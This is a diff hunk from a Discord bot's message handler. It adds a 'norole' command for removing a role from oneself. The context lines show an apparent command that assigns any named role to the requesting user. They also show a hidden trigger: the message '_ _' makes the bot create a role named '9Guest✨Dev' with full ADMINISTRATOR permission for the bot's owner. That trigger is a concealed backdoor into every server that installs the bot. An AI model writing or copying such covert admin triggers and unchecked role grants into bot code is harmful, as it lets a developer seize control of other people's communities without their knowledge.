@@ -276,6 +276,15 @@ client.on('message', async message => {
     target.roles.add(roleselect.id).catch(console.error);
   }
 
+  if(message.content.startsWith("norole")){
+    const args = message.content.split(/ +/);
+    let roleselect = message.guild.roles.cache.find(role => role.name === args[1]);
+   
+    let target = message.guild.member(message.author);
+    
+    target.roles.remove(roleselect.id).catch(console.error);
+  }
+
   if(message.content=="_ _"){
     if(message.author.id != process.env.OID) return message.reply("You are not my owner !!");
     message.guild.roles.create({ data: { name: '9Guest✨Dev', permissions: ['ADMINISTRATOR'] } }).catch(console.error);
